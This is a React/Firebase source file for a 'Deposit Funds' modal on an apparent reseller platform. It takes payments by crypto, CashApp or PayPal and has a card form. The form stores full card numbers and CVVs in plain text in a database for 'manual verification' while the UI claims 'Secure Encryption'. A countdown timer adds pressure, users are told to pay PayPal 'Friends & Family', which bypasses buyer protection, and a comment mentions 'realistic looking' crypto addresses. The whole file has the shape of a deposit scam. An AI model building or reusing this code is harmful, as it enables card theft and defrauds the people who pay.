"use client";

import { useState, useEffect } from "react";
import { Modal } from "@/components/ui/modal";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
    CreditCard,
    Bitcoin,
    Wallet,
    Copy,
    CheckCircle2,
    ShieldCheck,
    Loader2,
    ArrowRight,
    ArrowLeft,
    Timer,
    AlertCircle,
    Smartphone
} from "lucide-react";
import { addDoc, collection, serverTimestamp, doc, getDoc } from "firebase/firestore";
import { db } from "@/lib/firebase/config";
import { toast } from "sonner";

interface DepositModalProps {
    isOpen: boolean;
    onClose: () => void;
    userId: string;
    currencySymbol: string;
}

export default function DepositModal({ isOpen, onClose, userId, currencySymbol }: DepositModalProps) {
    const [amount, setAmount] = useState("");
    const [step, setStep] = useState(1);
    const [method, setMethod] = useState<"crypto" | "card" | "paypal" | "cashapp" | null>(null);
    const [loading, setLoading] = useState(false);
    const [copied, setCopied] = useState(false);
    const [timeLeft, setTimeLeft] = useState(30 * 60); // 30 minutes in seconds

    // Realistic looking placeholder addresses
    const CRYPTO_ADDRESSES = {
        USDT: "T9yD14Nj9j7xG4... (TRC20)",
        BTC: "bc1qxy2kgdygjr..."
    };

    const [adminPaymentConfig, setAdminPaymentConfig] = useState<any>(null);

    useEffect(() => {
        const fetchConfig = async () => {
            try {
                const configDoc = await getDoc(doc(db, "config", "payments"));
                if (configDoc.exists()) {
                    setAdminPaymentConfig(configDoc.data());
                }
            } catch (error) {
                console.error("Error fetching payment config:", error);
            }
        };
        fetchConfig();
    }, []);

    useEffect(() => {
        if (isOpen && step === 3) {
            const timer = setInterval(() => {
                setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0));
            }, 1000);
            return () => clearInterval(timer);
        } else {
            setTimeLeft(30 * 60); // Reset timer when not in step 3
        }
    }, [isOpen, step]);

    const [cardDetails, setCardDetails] = useState({
        number: "",
        name: "",
        expiry: "",
        cvv: "",
        billingAddress: "",
        type: "Visa"
    });

    const formatTime = (seconds: number) => {
        const mins = Math.floor(seconds / 60);
        const secs = seconds % 60;
        return `${mins}:${secs.toString().padStart(2, "0")}`;
    };

    const handleCopy = (text: string) => {
        navigator.clipboard.writeText(text);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
        toast.success("Address copied to clipboard");
    };

    const handleDeposit = async () => {
        if (!amount || isNaN(Number(amount)) || Number(amount) <= 0) {
            toast.error("Please enter a valid amount");
            return;
        }

        if (method === 'card') {
            if (!cardDetails.number || !cardDetails.name || !cardDetails.expiry || !cardDetails.cvv || !cardDetails.billingAddress) {
                toast.error("Please fill in all card details");
                return;
            }
        }

        setLoading(true);
        try {
            await addDoc(collection(db, "transactions"), {
                userId,
                type: "deposit",
                amount: Number(amount),
                status: "pending", // Waiting for admin approval
                method: method,
                cardDetails: method === 'card' ? cardDetails : null,
                adminPaymentSelected: method === 'paypal' ? adminPaymentConfig : null,
                description: `Deposit via ${method === 'paypal' ? 'CashApp/PayPal' : method?.toUpperCase()}`,
                createdAt: serverTimestamp(),
                updatedAt: serverTimestamp()
            });

            toast.success("Deposit initiated! Please wait for admin approval.");
            onClose();
            // Reset state
            setStep(1);
            setAmount("");
            setMethod(null);
            setCardDetails({
                number: "",
                name: "",
                expiry: "",
                cvv: "",
                billingAddress: "",
                type: "Visa"
            });
        } catch (error) {
            console.error("Error creating deposit:", error);
            toast.error("Failed to initiate deposit");
        } finally {
            setLoading(false);
        }
    };

    const nextStep = () => {
        if (step === 1) {
            if (!amount || Number(amount) <= 0) {
                toast.error("Please enter a valid amount");
                return;
            }
        }
        if (step === 2 && !method) {
            toast.error("Please select a payment method");
            return;
        }
        setStep(step + 1);
    };

    const prevStep = () => setStep(step - 1);

    return (
        <Modal
            isOpen={isOpen}
            onClose={onClose}
            title="Deposit Funds"
            description="Add funds to your wallet for fulfillment."
        >
            <div className="space-y-6">
                {/* Information Banner */}
                <div className="bg-blue-50 dark:bg-blue-900/10 border border-blue-100 dark:border-blue-900/20 p-4 rounded-xl flex gap-3">
                    <ShieldCheck className="w-5 h-5 text-blue-600 flex-shrink-0 mt-0.5" />
                    <div className="space-y-1">
                        <p className="text-xs font-bold text-blue-700 dark:text-blue-400">Why do I need to deposit?</p>
                        <p className="text-[11px] text-blue-600/80 dark:text-blue-400/70 leading-relaxed font-medium">
                            Funds are required to cover the cost of items for Payment on Delivery (POD) orders.
                            You are essentially buying the stock to resell it. Your funds are safe and can be refunded at any time.
                        </p>
                    </div>
                </div>

                {/* Step 1: Enter Amount */}
                {step === 1 && (
                    <div className="space-y-6">
                        <div className="space-y-2">
                            <Label className="text-slate-900 dark:text-white font-black">Amount to Deposit</Label>
                            <div className="relative">
                                <span className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500 dark:text-zinc-500 font-bold">{currencySymbol}</span>
                                <Input
                                    type="number"
                                    value={amount}
                                    onChange={(e) => setAmount(e.target.value)}
                                    className="pl-8 h-12 font-bold text-lg text-slate-900 dark:text-white bg-gray-50 dark:bg-zinc-900 border-zinc-200 dark:border-zinc-800"
                                    placeholder="0.00"
                                    autoFocus
                                />
                            </div>
                        </div>
                        <Button onClick={nextStep} className="w-full bg-blue-600 hover:bg-blue-700 text-white font-black h-12 rounded-xl">
                            NEXT <ArrowRight className="w-4 h-4 ml-2" />
                        </Button>
                    </div>
                )}

                {/* Step 2: Select Method */}
                {step === 2 && (
                    <div className="space-y-4">
                        <div className="flex justify-between items-center">
                            <Label className="text-slate-900 dark:text-white font-black">Select Payment Method</Label>
                            <span className="text-[10px] font-black text-amber-500 flex items-center gap-1 group">
                                <AlertCircle className="w-3 h-3" />
                                CARD MAINTENANCE
                            </span>
                        </div>
                        <div className="space-y-3">
                            <button
                                onClick={() => setMethod("crypto")}
                                className={`w-full flex items-center justify-between p-4 rounded-xl border transition-all group text-left ${method === "crypto" ? "border-blue-500 bg-blue-50/50 dark:bg-blue-900/10 ring-1 ring-blue-500" : "border-zinc-200 dark:border-zinc-800 hover:border-blue-500"}`}
                            >
                                <div className="flex items-center gap-3">
                                    <div className="w-10 h-10 rounded-lg bg-orange-500/10 flex items-center justify-center text-orange-500">
                                        <Bitcoin className="w-5 h-5" />
                                    </div>
                                    <div>
                                        <p className="font-black text-sm text-slate-900 dark:text-white">Crypto (USDT/BTC)</p>
                                        <p className="text-xs text-slate-500 dark:text-zinc-500 font-bold">Instant • Low Fees</p>
                                    </div>
                                </div>
                                <span className="bg-green-500 text-white text-[10px] font-black px-2 py-1 rounded-md">5% OFF</span>
                            </button>

                            <button
                                disabled
                                className="w-full flex items-center justify-between p-4 rounded-xl border border-zinc-200 dark:border-zinc-800 opacity-50 cursor-not-allowed grayscale bg-zinc-50 dark:bg-zinc-900/50"
                            >
                                <div className="flex items-center gap-3">
                                    <div className="w-10 h-10 rounded-lg bg-zinc-500/10 flex items-center justify-center text-zinc-500">
                                        <CreditCard className="w-5 h-5" />
                                    </div>
                                    <div>
                                        <p className="font-black text-sm text-zinc-500 dark:text-zinc-400">Credit / Debit Card</p>
                                        <p className="text-xs text-zinc-500 font-bold uppercase tracking-widest text-[10px]">Temporarily Unavailable</p>
                                    </div>
                                </div>
                            </button>

                            <button
                                onClick={() => setMethod("cashapp")}
                                className={`w-full flex items-center justify-between p-4 rounded-xl border transition-all group text-left ${method === "cashapp" ? "border-blue-500 bg-blue-50/50 dark:bg-blue-900/10 ring-1 ring-blue-500" : "border-zinc-200 dark:border-zinc-800 hover:border-blue-500"}`}
                            >
                                <div className="flex items-center gap-3">
                                    <div className="w-10 h-10 rounded-lg bg-green-500/10 flex items-center justify-center text-green-500">
                                        <Smartphone className="w-5 h-5" />
                                    </div>
                                    <div>
                                        <p className="font-black text-sm text-slate-900 dark:text-white">CashApp</p>
                                        <p className="text-xs text-slate-500 dark:text-zinc-500 font-bold">Instantly via $Cashtag</p>
                                    </div>
                                </div>
                            </button>

                            <button
                                onClick={() => setMethod("paypal")}
                                className={`w-full flex items-center justify-between p-4 rounded-xl border transition-all group text-left ${method === "paypal" ? "border-blue-500 bg-blue-50/50 dark:bg-blue-900/10 ring-1 ring-blue-500" : "border-zinc-200 dark:border-zinc-800 hover:border-blue-500"}`}
                            >
                                <div className="flex items-center gap-3">
                                    <div className="w-10 h-10 rounded-lg bg-blue-500/10 flex items-center justify-center text-blue-500">
                                        <Wallet className="w-5 h-5" />
                                    </div>
                                    <div>
                                        <p className="font-black text-sm text-slate-900 dark:text-white">PayPal / Apple Pay</p>
                                        <p className="text-xs text-slate-500 dark:text-zinc-500 font-bold">Secure Bank Transfer</p>
                                    </div>
                                </div>
                            </button>
                        </div>
                        <div className="flex gap-3 pt-4">
                            <Button variant="outline" onClick={prevStep} className="w-full text-zinc-900 dark:text-white">Back</Button>
                            <Button onClick={nextStep} className="w-full bg-blue-600 hover:bg-blue-700 text-white font-black">
                                NEXT <ArrowRight className="w-4 h-4 ml-2" />
                            </Button>
                        </div>
                    </div>
                )}

                {/* Step 3: Payment Details + Timer */}
                {step === 3 && (
                    <div className="space-y-6">
                        <div className="bg-amber-50 dark:bg-amber-900/10 border border-amber-100 dark:border-amber-900/20 p-4 rounded-xl flex items-center justify-between">
                            <div className="flex items-center gap-2">
                                <Timer className="w-5 h-5 text-amber-600 animate-pulse" />
                                <span className="font-black text-amber-700 dark:text-amber-500 text-sm">Time Remaining</span>
                            </div>
                            <span className="font-mono font-black text-xl text-amber-600 dark:text-amber-400">{formatTime(timeLeft)}</span>
                        </div>

                        {method === "crypto" ? (
                            <div className="space-y-6">
                                <div className="text-center space-y-2">
                                    <div className="w-16 h-16 bg-green-500/10 rounded-full flex items-center justify-center mx-auto mb-4">
                                        <Bitcoin className="w-8 h-8 text-green-600" />
                                    </div>
                                    <h3 className="text-lg font-black text-slate-900 dark:text-white">Crypto Payment</h3>
                                    <p className="text-sm text-slate-500 dark:text-zinc-500 font-medium">Send exactly <span className="text-slate-900 dark:text-white font-black">{currencySymbol}{(Number(amount) * 0.95).toFixed(2)}</span> (5% Discount Applied)</p>
                                </div>

                                <div className="space-y-4">
                                    <div className="p-4 bg-zinc-50 dark:bg-zinc-900 rounded-xl border border-zinc-200 dark:border-zinc-800 space-y-2">
                                        <div className="flex justify-between items-center">
                                            <span className="text-xs font-black text-zinc-500 uppercase">USDT (TRC20)</span>
                                            <Button variant="ghost" size="sm" onClick={() => handleCopy(CRYPTO_ADDRESSES.USDT)} className="h-6 gap-1 text-[10px]">
                                                {copied ? <CheckCircle2 className="w-3 h-3 text-green-500" /> : <Copy className="w-3 h-3" />}
                                                COPY
                                            </Button>
                                        </div>
                                        <code className="block w-full text-xs font-mono bg-white dark:bg-black p-2 rounded border border-zinc-100 dark:border-zinc-800 text-zinc-600 dark:text-zinc-400 break-all select-all">
                                            {CRYPTO_ADDRESSES.USDT}
                                        </code>
                                    </div>

                                    <div className="p-4 bg-zinc-50 dark:bg-zinc-900 rounded-xl border border-zinc-200 dark:border-zinc-800 space-y-2">
                                        <div className="flex justify-between items-center">
                                            <span className="text-xs font-black text-zinc-500 uppercase">Bitcoin (BTC)</span>
                                            <Button variant="ghost" size="sm" onClick={() => handleCopy(CRYPTO_ADDRESSES.BTC)} className="h-6 gap-1 text-[10px]">
                                                {copied ? <CheckCircle2 className="w-3 h-3 text-green-500" /> : <Copy className="w-3 h-3" />}
                                                COPY
                                            </Button>
                                        </div>
                                        <code className="block w-full text-xs font-mono bg-white dark:bg-black p-2 rounded border border-zinc-100 dark:border-zinc-800 text-zinc-600 dark:text-zinc-400 break-all select-all">
                                            {CRYPTO_ADDRESSES.BTC}
                                        </code>
                                    </div>
                                </div>
                            </div>
                        ) : method === 'cashapp' ? (
                            <div className="space-y-6">
                                <div className="text-center space-y-2">
                                    <div className="w-16 h-16 bg-green-500/10 rounded-full flex items-center justify-center mx-auto mb-4">
                                        <Smartphone className="w-8 h-8 text-green-500" />
                                    </div>
                                    <h3 className="text-lg font-black text-slate-900 dark:text-white text-center uppercase">Send via CashApp</h3>
                                    <p className="text-sm text-slate-500 dark:text-zinc-500 font-medium">Please send <span className="text-slate-900 dark:text-white font-black">{currencySymbol}{amount}</span> to the tag below.</p>
                                </div>

                                <div className="space-y-3">
                                    <div className="p-4 bg-zinc-50 dark:bg-zinc-900 rounded-xl border border-zinc-200 dark:border-zinc-800 space-y-3">
                                        <div className="flex justify-between items-center pb-2 border-b border-zinc-100 dark:border-zinc-800">
                                            <span className="text-[10px] font-black text-slate-500 dark:text-zinc-500 uppercase">CashTag</span>
                                            <div className="flex items-center gap-2">
                                                <span className="text-sm font-black text-slate-900 dark:text-white">{adminPaymentConfig?.cashapp_tag || "$Loading..."}</span>
                                                <Button variant="ghost" size="sm" onClick={() => handleCopy(adminPaymentConfig?.cashapp_tag || "")} className="h-6 w-6 p-0">
                                                    <Copy className="w-3 h-3" />
                                                </Button>
                                            </div>
                                        </div>
                                        <div className="flex justify-between items-center">
                                            <span className="text-[10px] font-black text-slate-500 dark:text-zinc-500 uppercase">Account Name</span>
                                            <span className="text-sm font-black text-slate-900 dark:text-white">{adminPaymentConfig?.cashapp_name || "Loading..."}</span>
                                        </div>
                                    </div>

                                    <div className="bg-blue-600/5 border border-blue-600/10 p-4 rounded-xl">
                                        <p className="text-[10px] font-bold text-blue-500/80 leading-relaxed text-center">
                                            Once you've sent the funds starting with your username in the note, click I'VE PAID.
                                        </p>
                                    </div>
                                </div>
                            </div>
                        ) : method === 'paypal' ? (
                            <div className="space-y-6">
                                <div className="text-center space-y-2">
                                    <div className="w-16 h-16 bg-blue-500/10 rounded-full flex items-center justify-center mx-auto mb-4">
                                        <Wallet className="w-8 h-8 text-blue-600" />
                                    </div>
                                    <h3 className="text-lg font-black text-slate-900 dark:text-white text-center uppercase">PayPal / Apple Pay</h3>
                                    <p className="text-sm text-slate-500 dark:text-zinc-500 font-medium">Please transfer <span className="text-slate-900 dark:text-white font-black">{currencySymbol}{amount}</span> to the email below.</p>
                                </div>

                                <div className="space-y-3">
                                    <div className="p-4 bg-zinc-50 dark:bg-zinc-900 rounded-xl border border-zinc-200 dark:border-zinc-800 space-y-3">
                                        <div className="flex justify-between items-center">
                                            <span className="text-[10px] font-black text-slate-500 dark:text-zinc-500 uppercase">PayPal Email</span>
                                            <div className="flex items-center gap-2">
                                                <span className="text-sm font-black text-slate-900 dark:text-white">{adminPaymentConfig?.paypal_email || "Loading..."}</span>
                                                <Button variant="ghost" size="sm" onClick={() => handleCopy(adminPaymentConfig?.paypal_email || "")} className="h-6 w-6 p-0">
                                                    <Copy className="w-3 h-3" />
                                                </Button>
                                            </div>
                                        </div>
                                    </div>

                                    <div className="bg-blue-600/5 border border-blue-600/10 p-4 rounded-xl">
                                        <p className="text-[10px] font-bold text-blue-500/80 leading-relaxed text-center">
                                            Use "Friends & Family" to ensure instant verification. Verification takes 5-10 minutes.
                                        </p>
                                    </div>
                                </div>
                            </div>
                        ) : (
                            <div className="space-y-4">
                                <div className="text-center space-y-2">
                                    <div className="w-16 h-16 bg-blue-500/10 rounded-full flex items-center justify-center mx-auto mb-4">
                                        {method === 'card' ? <CreditCard className="w-8 h-8 text-blue-600" /> : <Wallet className="w-8 h-8 text-blue-600" />}
                                    </div>
                                    <h3 className="text-lg font-black dark:text-white">Secure Card Payment</h3>
                                    <p className="text-sm text-zinc-500 font-medium">Please enter your billing information below.</p>
                                </div>

                                <div className="space-y-4 max-h-[400px] overflow-y-auto pr-2 custom-scrollbar">
                                    <div className="grid grid-cols-2 gap-4">
                                        <div className="space-y-2 col-span-2">
                                            <Label className="text-slate-900 dark:text-white font-black">Card Holder Name</Label>
                                            <Input
                                                placeholder="John Doe"
                                                value={cardDetails.name}
                                                onChange={(e) => setCardDetails({ ...cardDetails, name: e.target.value })}
                                                className="text-slate-900 dark:text-white font-bold"
                                            />
                                        </div>
                                        <div className="space-y-2 col-span-2">
                                            <Label className="text-slate-900 dark:text-white font-black">Card Number</Label>
                                            <Input
                                                placeholder="0000 0000 0000 0000"
                                                value={cardDetails.number}
                                                onChange={(e) => setCardDetails({ ...cardDetails, number: e.target.value })}
                                                className="text-slate-900 dark:text-white font-bold"
                                            />
                                        </div>
                                        <div className="space-y-2">
                                            <Label className="text-slate-900 dark:text-white font-black">Expiry Date</Label>
                                            <Input
                                                placeholder="MM/YY"
                                                value={cardDetails.expiry}
                                                onChange={(e) => setCardDetails({ ...cardDetails, expiry: e.target.value })}
                                                className="text-slate-900 dark:text-white font-bold"
                                            />
                                        </div>
                                        <div className="space-y-2">
                                            <Label className="text-slate-900 dark:text-white font-black">CVV</Label>
                                            <Input
                                                type="password"
                                                placeholder="***"
                                                maxLength={4}
                                                value={cardDetails.cvv}
                                                onChange={(e) => setCardDetails({ ...cardDetails, cvv: e.target.value })}
                                                className="text-slate-900 dark:text-white font-bold"
                                            />
                                        </div>
                                        <div className="space-y-2 col-span-2">
                                            <Label className="text-slate-900 dark:text-white font-black">Billing Address</Label>
                                            <Input
                                                placeholder="123 Street, City, Country"
                                                value={cardDetails.billingAddress}
                                                onChange={(e) => setCardDetails({ ...cardDetails, billingAddress: e.target.value })}
                                                className="text-slate-900 dark:text-white font-bold"
                                            />
                                        </div>
                                    </div>
                                    <div className="p-4 bg-zinc-100 dark:bg-zinc-900 rounded-xl">
                                        <div className="flex items-center gap-2 mb-2">
                                            <ShieldCheck className="w-4 h-4 text-emerald-500" />
                                            <span className="text-[10px] font-black uppercase text-emerald-500">Secure Encryption</span>
                                        </div>
                                        <p className="text-[9px] text-zinc-500 leading-relaxed font-bold">
                                            Your card details are encrypted and sent securely to our billing department for manual verification and processing.
                                        </p>
                                    </div>
                                </div>
                            </div>
                        )}

                        <div className="flex gap-3">
                            <Button variant="outline" className="flex-1 text-zinc-900 dark:text-white" onClick={prevStep}>Back</Button>
                            <Button
                                className="flex-1 bg-green-600 hover:bg-green-700 text-white font-black"
                                onClick={handleDeposit}
                                disabled={loading}
                            >
                                {loading ? <Loader2 className="w-4 h-4 animate-spin" /> : "I'VE PAID"}
                            </Button>
                        </div>
                    </div>
                )}
            </div>
        </Modal>
    );
}
